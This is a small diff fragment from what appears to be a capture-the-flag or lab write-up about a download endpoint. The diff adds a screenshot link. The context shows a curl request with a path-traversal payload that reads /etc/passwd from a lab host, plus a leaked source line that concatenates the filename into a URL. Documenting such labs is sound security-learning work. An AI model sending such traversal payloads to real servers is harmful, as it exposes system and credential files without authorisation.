@@ -133,6 +133,8 @@ Submitting a non-integer `?id=` value triggered a Python `ValueError`. Because `
 curl "http://10.65.161.138/download?id=../../../etc/passwd"
 ```
 
+![Nmap Scan](etc_passwd.png)
+
 **Leaked source (app.py line 31–34):**
 ```python
 crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
